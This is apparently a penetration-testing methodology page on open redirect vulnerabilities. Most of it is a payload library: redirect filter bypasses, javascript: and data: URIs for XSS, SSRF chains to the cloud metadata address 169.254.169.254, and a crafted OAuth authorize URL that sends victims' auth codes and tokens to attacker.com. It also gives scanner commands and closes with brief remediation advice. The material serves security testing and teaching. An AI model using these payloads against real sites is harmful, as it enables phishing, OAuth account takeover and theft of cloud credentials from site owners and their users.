---
title: "Open Redirect"
date: 2026-02-24
draft: false
---

# Open Redirect

> **Severity**: Medium–High | **CWE**: CWE-601
> **OWASP**: A01:2021 – Broken Access Control

---

## What Is Open Redirect?

An open redirect occurs when an application uses user-controlled input to construct a redirect URL without proper validation. Direct impact is limited (phishing), but open redirects are critical as **chain links** for OAuth token theft, SSRF bypass, and CSP bypass.

```
https://trusted.com/redirect?url=https://attacker.com/phishing
↑ User trusts trusted.com domain in URL bar → follows redirect → lands on attacker site
```

**High-impact chains**:
- Open redirect → **OAuth code theft** (steal auth code via malicious redirect_uri chain)
- Open redirect → **SSRF bypass** (allowlisted domain, then redirects to internal IP)
- Open redirect → **CSP bypass** (whitelisted domain hosts attacker script)
- Open redirect → **XSS** via `javascript:` URI

---

## Discovery Checklist

- [ ] Find redirect parameters: `?url=`, `?next=`, `?redirect=`, `?goto=`, `?return=`, `?returnUrl=`, `?dest=`, `?destination=`, `?redir=`, `?target=`, `?continue=`, `?forward=`
- [ ] Check POST body fields named `redirect`, `next`, `returnTo`
- [ ] Test `Location:` header manipulation via response splitting
- [ ] Test OAuth `redirect_uri` parameter (see 29_OAuth.md)
- [ ] Test password reset email links
- [ ] Test SSO logout endpoints (`?slo=`, `?sloUrl=`)
- [ ] Check for validation type: prefix match, contains match, regex
- [ ] Test `javascript:` URI for XSS via redirect
- [ ] Test `//attacker.com` (protocol-relative) to bypass `https://` prefix check
- [ ] Test `data:` and `vbscript:` URIs
- [ ] Use Wayback Machine / JS analysis to find hidden redirect params

---

## Payload Library

### Payload 1 — Basic Open Redirect

```
# Direct external URL:
https://target.com/redirect?url=https://attacker.com
https://target.com/goto?next=https://attacker.com/phishing

# Protocol-relative (bypass https:// prefix check):
https://target.com/redirect?url=//attacker.com
https://target.com/redirect?url=///attacker.com
https://target.com/redirect?url=////attacker.com

# No-protocol with backslash (browser normalizes to //):
https://target.com/redirect?url=\\attacker.com
https://target.com/redirect?url=/\\attacker.com
https://target.com/redirect?url=\/attacker.com

# Using @-sign (everything before @ is treated as userinfo):
https://target.com/redirect?url=https://target.com@attacker.com
https://target.com/redirect?url=@attacker.com

# Fragment-based bypass:
https://target.com/redirect?url=https://attacker.com#target.com
```

### Payload 2 — Bypass Techniques per Validation Type

```bash
# === BYPASS: url must start with "https://target.com" ===

# Inject null byte to break prefix:
https://target.com%00.attacker.com
https://target.com\x00.attacker.com

# Unicode confusion:
https://target.com/.attacker.com   # subdomain of target? No — new domain
https://target﹒com.attacker.com   # Unicode period (U+FE52)
https://target。com.attacker.com   # Fullwidth period (U+3002)

# Abuse path-relative redirect:
https://target.com/redirect?url=https://target.com/../../../attacker.com

# === BYPASS: url must contain "target.com" ===

https://attacker.com?target.com      # target.com in query string
https://attacker.com#target.com      # target.com in fragment
https://attacker.com.evil.com        # ends with target.com → evil.com subdomain
https://target.com.attacker.com      # starts with target.com

# === BYPASS: url must end with "target.com" ===

https://attacker.com/?q=target.com
https://attacker.com/#target.com
https://attacker.com%2F%2Ftarget.com  # encoded path

# === BYPASS: filter blocks external URLs, allows /path ===

# Whitelisted path redirect → redirect to evil:
/redirect?url=/logout?next=https://attacker.com    # chain
# Protocol-relative absolute URL:
//attacker.com/page
# Whitespace prefix (some parsers strip leading spaces):
%20https://attacker.com
%09https://attacker.com   # tab
%0ahttps://attacker.com   # newline
```

### Payload 3 — `javascript:` URI for XSS via Redirect

```bash
# If app uses Location header with user input → javascript: URI:
javascript:alert(document.cookie)
javascript:alert(1)

# Encoding variants to bypass filters:
JavaScript:alert(1)          # case variation
JAVASCRIPT:alert(1)
java%09script:alert(1)       # tab between java and script
java%0dscript:alert(1)       # CRLF
javascript%3Aalert(1)        # URL-encode the colon
&#106;avascript:alert(1)     # HTML entity 'j'
&#x6A;avascript:alert(1)     # hex entity

# With whitespace prefix (browsers strip leading whitespace in href):
%20javascript:alert(1)
%0Ajavascript:alert(1)
%09javascript:alert(1)

# via data: URI:
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Payload 4 — SSRF via Open Redirect

```bash
# When SSRF filter only allows specific domains → chain through open redirect:
# SSRF allowlist: target.com
# Open redirect at: https://target.com/redirect?url=

# SSRF payload → target the open redirect:
https://target.com/ssrf?url=https://target.com/redirect?url=http://169.254.169.254/

# AWS metadata via redirect chain:
https://target.com/ssrf-endpoint?url=https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/

# Internal service via redirect:
https://target.com/fetch?resource=https://target.com/goto?next=http://internal.service:8080/admin

# Multiple redirect hops:
https://target.com/r?url=https://target.com/redirect?url=https://target.com/redir?next=http://10.0.0.1/
```

### Payload 5 — OAuth Token Theft via Open Redirect

```bash
# If OAuth redirect_uri can chain through open redirect:
# Registered URI: https://app.com/callback
# Open redirect: https://app.com/redirect?url=https://attacker.com

# Craft malicious OAuth authorize URL:
https://oauth-server.com/authorize?
  client_id=APP_CLIENT_ID&
  response_type=code&
  redirect_uri=https://app.com/redirect?url=https://attacker.com&
  scope=profile+email

# Victim authorizes → redirected to:
https://app.com/redirect?url=https://attacker.com?code=AUTH_CODE
# → attacker.com receives auth code in query string or Referer
# → Exchanges code for access token

# Same attack with implicit flow (token in fragment):
response_type=token
# Token in fragment: https://attacker.com#access_token=...
# JavaScript reads location.hash
```

### Payload 6 — Meta Refresh / HTML Redirect

```bash
# If app reflects the redirect URL in HTML meta tag or script:
<meta http-equiv="refresh" content="0;url=ATTACKER_INPUT">

# Inject into meta refresh:
https://attacker.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>

# If reflected in script:
<script>window.location = "ATTACKER_INPUT";</script>
# Inject: ";alert(1);//
# Or: javascript:alert(1)
```

### Payload 7 — Path-Based Open Redirect

```bash
# Application redirects based on path:
# https://target.com//attacker.com → browser may interpret as open redirect

# Double slash:
https://target.com//attacker.com/

# Protocol-relative path on location header:
# If server sends: Location: //attacker.com → protocol-relative redirect
# Test via CRLF injection in URL:
https://target.com/%0d%0aLocation: //attacker.com

# Spring Security forward:
https://target.com/login?redirect=forward:http://attacker.com
```

---

## Tools

```bash
# OpenRedirEx — open redirect scanner:
git clone https://github.com/devanshbatham/OpenRedireX
python3 openredirex.py -l urls.txt -p payloads.txt

# ffuf — fuzz redirect parameter:
ffuf -u "https://target.com/redirect?url=FUZZ" \
  -w /usr/share/seclists/Fuzzing/open-redirect-payloads.txt \
  -mc 301,302,303,307,308 -o results.json

# gf — grep interesting parameters from URLs:
gf redirect urls.txt   # requires gf patterns installed

# Find redirect parameters in JS:
grep -rn "location\|redirect\|window\.location\|document\.location" \
  --include="*.js" . | grep -i "param\|url\|next\|return"

# Waybackurls + grep for redirect params:
waybackurls target.com | grep -E "\?.*=(https?:|//|javascript:)"

# Check if redirect preserves cookies (potential session leakage):
curl -v -L -c cookies.txt "https://target.com/redirect?url=https://attacker.com" 2>&1 | \
  grep -E "Location:|Cookie:|Set-Cookie:"

# oauth redirect_uri tester:
curl -s "https://oauth-server.com/authorize?client_id=X&redirect_uri=https://target.com/redirect?url=https://attacker.com&response_type=code" \
  -c cookies.txt -b "user_session=VALID_SESSION" -L -v 2>&1 | grep -i "location"
```

---

## Remediation Reference

- **Allowlist redirect targets**: only allow relative paths or a fixed list of trusted domains
- **Reject external URLs entirely** if business logic doesn't require cross-domain redirect
- **Validate scheme**: reject `javascript:`, `data:`, `vbscript:`, allow only `https://`
- **Strict host validation**: parse URL server-side and compare host against allowlist — don't use `startsWith` string matching
- **Use indirect references**: map tokens (`redirect=1`) to pre-defined destinations server-side
- **Warn users**: if external redirect is required, show intermediate warning page with destination URL

*Part of the Web Application Penetration Testing Methodology series.*
